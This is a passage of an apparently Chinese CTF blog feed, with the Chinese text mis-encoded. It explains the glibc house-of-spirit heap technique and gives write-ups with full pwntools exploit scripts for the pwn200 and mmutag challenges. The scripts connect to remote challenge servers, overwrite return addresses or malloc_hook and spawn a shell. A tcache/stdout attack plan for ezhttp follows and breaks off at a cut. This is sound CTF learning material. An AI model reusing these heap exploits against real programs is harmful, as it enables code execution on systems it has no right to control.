class="hljs-comment">//ç°åœ¨ä¸‹ä¸€æ¬¡çš„mallocå°±å°†ä¼šè¿”å›æˆ‘ä»¬çš„fake chunkäº†</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc(0x30): %pn"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));&#125;</code></pre></div><p>æ­£å¸¸çš„hosæ˜¯éœ€è¦ä¼ªé€ ä¸¤ä¸ªchunkçš„ã€‚</p><div class="hljs"><pre><code class="hljs c">This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake 'fastbin' region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!malloc(0x30): 0x7ffe23a56260</code></pre></div><p>ç¨‹åºé¦–å…ˆåˆå§‹åŒ–äº†ä¸€ä¸‹å †,ç„¶åç”³è¯·äº†ä¸¤ä¸ªå˜é‡,ä¸€ä¸ªæ˜¯æˆ‘ä»¬å³å°†æ”»å‡»çš„å˜é‡ a,å¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬çš„<code>fake_chunks</code></p><p>ç¨‹åºå…ˆåœ¨<code>fake_chunks[1]</code>çš„åœ°æ–¹ä¹Ÿå°±æ˜¯sizeåŸŸä¼ªé€ äº†åˆæ³•çš„size,0x40(æ»¡è¶³fastbin sizeå¤§å°,ä¸16å­—èŠ‚å¯¹é½,æ ‡å¿—ä½æ­£ç¡®)</p><p>ä¹‹ååˆåœ¨ä¸‹ä¸€å¤„ä¼ªé€ äº†ç¬¬äºŒä¸ªchunk,å³ä»<code>fake_chunks[8]</code>å¼€å§‹çš„åœ°æ–¹,è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢,å› ä¸ºæˆ‘ä»¬ç¬¬ä¸€ä¸ªfake chunkçš„sizeä¼ªé€ æˆäº†0x40,é‚£ä¹ˆæˆ‘ä»¬ç¬¬äºŒä¸ªchunkå°±éœ€è¦åœ¨å‘ä¸‹0x40çš„åœ°æ–¹ä¹Ÿå°±æ˜¯<code>fake_chunks+8</code>çš„åœ°æ–¹ä¼ªé€ ç¬¬äºŒä¸ªchunkã€‚</p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>ä½¿ç”¨è¯¥æŠ€æœ¯åˆ†é… chunk åˆ°æŒ‡å®šåœ°å€ï¼Œä½¿ç›®æ ‡ä½ç½®æˆä¸ºå¯æ§åŒºåŸŸï¼Œå…³é”®æ˜¯è¦èƒ½å¤Ÿä¿®æ”¹æŒ‡å®šåœ°å€çš„å‰åçš„å†…å®¹ï¼Œä¼ªé€ å‡º2ä¸ªå †ï¼Œä½¿å…¶å¯ä»¥ç»•è¿‡å¯¹åº”çš„æ£€æµ‹ã€‚</p><p>è¿˜æœ‰å°±æ˜¯è¦æœ‰åŠæ³•è¦†ç›–å †æŒ‡é’ˆï¼Œåˆ°ç›®æ ‡åœ°å€ã€‚</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¤´ä¸è¾“å…¥<code>\n</code>ï¼Œå¡«å……48å­—ç¬¦å¯ä»¥æ³„éœ²å‡ºstackåœ°å€</li><li>æœ‰ç¬¬ä¸€æ®µå¯æ§çš„æ ˆï¼Œä¸”å¯ä»¥è¦†ç›–åˆ°heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>ä¸€æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªå †ï¼Œå¤§å°0-0x80,ä¸”å…ˆé‡Šæ”¾æ‰èƒ½å†æ¬¡ç”³è¯·ã€‚</li></ul><p>ä¿æŠ¤æƒ…å†µï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥å¯ä»¥å†™shellcodeï¼Œjmp ä¸Šå»å³å¯ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>åˆ©ç”¨å¯æ§çš„æ ˆï¼Œhos åœ¨æ ˆä¸Šfake ä¸€ä¸ªå †ï¼Œä¿è¯å¯ä»¥æ”¹åˆ°ret address</li></ul><p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹å¯æ§æ ˆçš„å†…å­˜æƒ…å†µ,<strong>æ­¤å‰idè¾“å…¥çš„æ˜¯65</strong>ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Sy4TQJ.png" srcset="/img/loading.gif" alt><br>å‰0x40ä¸ºå¯æ§åŒºåŸŸï¼Œç®­å¤´æŒ‡çš„æ–¹å‘æ˜¯å¯ä»¥è¦†ç›–çš„å †æŒ‡é’ˆï¼Œidçš„ä¸Šæ–¹æœ‰ä¸€ä¸ªret addressï¼Œå…¶åœ¨è¾“å…¥3é€€å‡ºæ—¶å¯ä»¥è·³è½¬åˆ°ã€‚æ‰€ä»¥å…¶ä¸ºç›®æ ‡åœ°å€ï¼Œå…¶å‰é¢æœ‰å¯æ§çš„0x40çš„åŒºåŸŸï¼Œåé¢ä¹Ÿæœ‰ä¸€ä¸ªid 0x8çš„å¯æ§åŒºåŸŸï¼Œæ»¡è¶³æ¡ä»¶ å¼€å§‹æ„é€ ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/fO0l4K.png" srcset="/img/loading.gif" alt></p><p>è¿™æ ·freeä¸€ä¸‹å°±ä¼šæœ‰ä¸ªè¿›å…¥fastbin åœ¨æ ˆä¸Šçš„fakeå †ï¼Œç”³è¯·ä¸Šå»å³å¯ä¿®æ”¹åˆ°ç›®æ ‡åŒºåŸŸã€‚</p><ul><li>ä¿®æ”¹ret addreeä¸ºshellcodeçš„åœ°å€ã€‚å…¶å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡è®©ä½ è¾“å…¥æ—¶ï¼Œæ”¾å…¥æ ˆä¸­ã€‚</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.anquanke.com/post/id/199468#h2-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199468#h2-19</a><br><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Houseç³»åˆ—</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp</title>
    <link href="/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp"><a href="#è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp" class="headerlink" title="è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp"></a>è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>ç»™äº†ä¸€ä¸ªæ ˆåœ°å€</li><li>æ²¡æœ‰showå‡½æ•°</li><li>free å‡½æ•°å­˜åœ¨uaf</li><li>addå‡½æ•°åªèƒ½ç”³è¯·å †å·ä¸º1-10çš„å †å—ï¼Œå¤§å°ä»…ä¸º0x68</li><li>å¯ä»¥ç»™æ ˆä¸Šè¯»ä¸€æ®µæ•°æ®</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span></code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )      <span class="hljs-keyword">break</span>;    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>uLL);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your content: %s\n"</span>, &amp;buf);</code></pre></div><p>åˆ©ç”¨è¿™ä¸ªå¯ä»¥æ³„æ¼æ ˆä¸Šçš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥åœ¨æ ˆä¸Šå†™ä¸€å®šçš„æ•°æ®ã€‚</p><h3 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><p>å¦‚ä½•æ³„æ¼libcåœ°å€ã€‚</p><p>æ ˆä¸Šæ˜¯æœ‰å¾ˆå¤šæ•°æ®çš„ï¼Œå¯ä»¥ç”¨choice 3è¿›è¡Œæ³„æ¼ä¸€å®šçš„æ•°æ®ï¼Œä½†æ˜¯ç”±äº<code>\x00</code>çš„æˆªæ–­ï¼Œæ³„æ¼ä¸€ä¸ªstackåœ°å€åï¼Œå…¶åæœ‰ç”¨çš„libcåœ°å€æ²¡åŠæ³•æ³„æ¼ã€‚</p><p>çœ‹ä¸‹å…¶æ ˆæƒ…å†µï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>å¯æ§åŒºåŸŸ0x20ï¼Œå¦‚æœå¯ä»¥å¡«å……å…¶ä¸­æ— ç”¨çš„æ•°æ®åˆ°libcåœ°å€ï¼Œå†åˆ©ç”¨ä¸€æ¬¡ choice 3 å³å¯å®Œæˆæ³„æ¼ã€‚</p><p>ç°åœ¨ä¹Ÿå·²ç»çŸ¥é“äº†stackçš„åœ°å€ã€‚ä¼ªé€ ä¸€ä¸ª0x70çš„å †ï¼Œç„¶åfastbin attackå³å¯ç”³è¯·åˆ°è¿™æ ˆä¸Šçš„å†…å­˜ã€‚ç„¶åå¡«å……ï¼Œè·å–libcåœ°å€ã€‚æ¥ç€æ”»å‡»malloc hookå³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./mmutag'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.61'</span>,<span class="hljs-number">55704</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_introduce</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'your introduce'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x60</span>sa(<span class="hljs-string">'name'</span>,data)ru(<span class="hljs-string">'0x'</span>)leak_libc = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0</span>)s(payload)add(<span class="hljs-number">4</span>,p64(leak_stack - <span class="hljs-number">0x40</span>))add(<span class="hljs-number">5</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x47</span> + <span class="hljs-string">'2'</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)s(<span class="hljs-string">'1'</span> * <span class="hljs-number">0x20</span>)info_addr(<span class="hljs-string">'leak-stack'</span>,leak_stack)ru(<span class="hljs-string">'2'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20840</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)malloc_hook  = <span class="hljs-number">0x3c4aed</span> + libc_baseadd(<span class="hljs-number">3</span>,p64(malloc_hook))add(<span class="hljs-number">8</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">3</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-string">'\x00'</span> + p64(one)add(<span class="hljs-number">10</span>,payload)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">3</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>æœ€åå› ä¸ºæ²¡æœ‰å †å¯ä»¥ç”³è¯·ï¼Œå¯ä»¥æ•…æ„è§¦å‘æŠ¥é”™ï¼Œå…¶ä¼šè°ƒç”¨åˆ°mallocæ¥å‚¨å­˜éƒ¨åˆ†æ•°æ®ï¼Œæ­¤æ—¶ä¹Ÿå°±å¯ä»¥get shellã€‚</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>çœ‹èµ·æ¥è¾ƒä¸ºå¤æ‚ï¼Œå› ä¸ºå®ç°äº†ä¸€ä¸ªå¯¹Http packetçš„äº¤äº’ï¼Œè®©æˆ‘è¿™ç§ä¸æ˜¯å¾ˆç†Ÿæ‚‰http packetï¼Œcodingèƒ½åŠ›å·®çš„äººï¼Œé€†å‘èµ·æ¥æœ‰ç‚¹åƒåŠ›ã€‚</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="å‰ç½®æŠ€èƒ½"><a href="#å‰ç½®æŠ€èƒ½" class="headerlink" title="å‰ç½®æŠ€èƒ½"></a>å‰ç½®æŠ€èƒ½</h4><ul><li>ç®€æ˜“çš„Http packetç»“æ„</li><li><code>setcontext</code> å‡½æ•°çš„exploit</li><li>å„ç§ä¸ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°<code>sscanf strchr strtok</code> </li></ul><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><ul><li>å¼€å¤´åˆå§‹åŒ–ï¼Œå¼€å¯äº†æ²™ç®±ï¼Œåªèƒ½orwæ¥è·å–flag</li><li>addå‡½æ•°ï¼Œä»¥è¾“å…¥çš„å­—ç¬¦æ•°é‡æ¥ç»™ä½ åˆ†é…å †ï¼Œæ‰€ä»¥<code>\x00</code>ç”¨ä¸äº†äº†ï¼Œæœ€å¤§0x100ï¼Œä¸”ç»™äº†heapçš„åœ°å€</li><li>del å‡½æ•°ï¼Œå­˜åœ¨uaf</li><li>æ— showå‡½æ•°</li><li>editå‡½æ•°ï¼Œå¯ä»¥è¾“å…¥<code>\x00</code>çš„å­—ç¬¦ï¼Œæ— vul</li></ul><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>free 0x100çš„chunk 8æ¬¡ï¼Œä½¿å…¶è¿›å…¥unsortbinï¼Œç•™ç€æ”»å‡»stdout</li><li>tcache attack æ”»å‡»åˆ°<code>_IO_2_1_stdout_</code> ï¼Œä½¿å…¶æ³„æ¼libcåœ°å€</li><li>tcache attack æ”»å‡»free hookï¼Œå†™ä¸Šsetcontext + 53 ï¼Œå‡†å¤‡sropè¿›è¡Œæ”»å‡»</li><li>sropè¯»å…¥mprotectçš„rop chainï¼Œå¼€å¯heapæ®µçš„æ‰§è¡Œæƒé™</li><li>edit ä¸€ä¸ªheapçš„å†…å­˜ä¸º orw flag</li><li>è§¦å‘free hookï¼Œorw get flag</li></ul><h3 id="ç»†èŠ‚é›†åˆ"><a href="#ç»†èŠ‚é›†åˆ" class="headerlink" title="ç»†èŠ‚é›†åˆ"></a>ç»†èŠ‚é›†åˆ</h3><h4 id="å¯¹äºstdoutçš„æ”»å‡»"><a href="#å¯¹äºstdoutçš„æ”»å‡»" class="headerlink" title="å¯¹äºstdoutçš„æ”»å‡»"></a>å¯¹äºstdoutçš„æ”»å‡»</h4><p>å…¶ä¸­ï¼Œåœ¨åˆ©ç”¨libcæ®‹ç•™ä¼ªé€ stdoutåœ°å€ä½œä¸ºfdçš„æ—¶å€™ï¼Œåªè¦æ”¹3å­—èŠ‚ï¼Œå…¶è‚¯å®šæ˜¯ç”³è¯·çš„0x20çš„å †ï¼Œä½†æ˜¯ä¸Šstdoutç»“æ„ä½“æ—¶éœ€è¦0x21å­—èŠ‚çš„å†™å…¥ã€‚<br>tcacheåˆ†é…ä¸­ï¼Œå¹¶ä¸éªŒè¯å †çš„å¤§å°ï¼Œåªè¦fdæŒ‡å¥½å°±OKäº†ï¼Œæ‰€ä»¥ç”³è¯·ä¸ªè‡³å°‘å¯ä»¥å†™å…¥0x21å­—èŠ‚çš„å †å³å¯ã€‚ä½†æ˜¯ç”±äºç¨‹åºåˆ†é…chunkçš„ç­–ç•¥ï¼Œç”³è¯·æ—¶è‚¯å®šè¦å†™æ•°æ®ï¼Œå†™ä»€ä¹ˆä¸ä¼šcrushã€‚ä¸ªäººåšçš„æ—¶å€™,ä¹±å¡«å……æ•°æ®ï¼Œcrushäº†å¾ˆå¤šæ¬¡ï¼Œå¤´éƒ½ç‚¸äº†ã€‚å¯ä»¥çœ‹ä¸€ä¸‹<code>_IO_2_1_stdout_</code>ç»“æ„ä½“ï¼š</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; ptype stdout<span class="hljs-built_in">type</span> = struct <span class="hljs-variable">_IO_FILE</span> &#123;    int <span class="hljs-variable">_flags</span>;    char *<span class="hljs-variable">_IO_read_ptr</span>;    char *<span class="hljs-variable">_IO_read_end</span>;    char *<span class="hljs-variable">_IO_read_base</span>;    char *<span class="hljs-variable">_IO_write_base</span>;      char *<span class="hljs-variable">_IO_write_ptr</span>;       char *<span class="hljs-variable">_IO_write_end</span>;    char *<span class="hljs-variable">_IO_buf_base</span>;    char *<span class="hljs-variable">_IO_buf_end</span>;    char *<span class="hljs-variable">_IO_save_base</span>;    char *<span class="hljs-variable">_IO_backup_base</span>;    char *<span class="hljs-variable">_IO_save_end</span>;    struct <span class="hljs-variable">_IO_marker</span> *<span class="hljs-variable">_markers</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_chain</span>;    int <span class="hljs-variable">_fileno</span>;    int <span class="hljs-variable">_flags2</span>;    <span class="hljs-variable">__off_t</span> <span class="hljs-variable">_old_offset</span>;    unsigned short <span class="hljs-variable">_cur_column</span>;    signed char <span class="hljs-variable">_vtable_offset</span>;    char <span class="hljs-variable">_shortbuf</span>[<span class="hljs-number">1</span>];    <span class="hljs-variable">_IO_lock_t</span> *<span class="hljs-variable">_lock</span>;    <span class="hljs-variable">__off64_t</span> <span class="hljs-variable">_offset</span>;    struct <span class="hljs-variable">_IO_codecvt</span> *<span class="hljs-variable">_codecvt</span>;    struct <span class="hljs-variable">_IO_wide_data</span> *<span class="hljs-variable">_wide_data</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_freeres_list</span>;    void *<span class="hljs-variable">_freeres_buf</span>;    size_t <span class="hljs-variable">__pad5</span>;    int <span class="hljs-variable">_mode</span>;    char <span class="hljs-variable">_unused2</span>[<span class="hljs-number">20</span>];&#125; *</code></pre></div><p>åœ¨å­¦ä¹ io fileç›¸å…³çŸ¥è¯†æ—¶ï¼Œå¯ä»¥äº†è§£åˆ°å¯¹äºè·å–å’Œè¾“å‡ºä¿¡æ¯ï¼Œå¾ˆé‡è¦çš„å°±æ˜¯å¼€å¤´<code>_flags</code> ï¼Œå…¶å†³å®šäº†æ­¤æ—¶ioçš„çŠ¶å†µã€‚</p><p>å…¶ä¸­æ³¨æ„åˆ°<code>_flags</code> å¤§å°æ˜¯intå‹ï¼Œæ‰€ä»¥åœ¨libcåœ°å€å…¶è¯»å–å’ŒéªŒè¯å°†è¦åšä»€ä¹ˆæ—¶ï¼Œæ˜¯ä»¥intçš„å®½åº¦æ¥è·å–çš„ã€‚æ‰€ä»¥è®¾ç½®å¯¹ä½ä½8å­—èŠ‚å³å¯ã€‚æ¯”å¦‚<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> 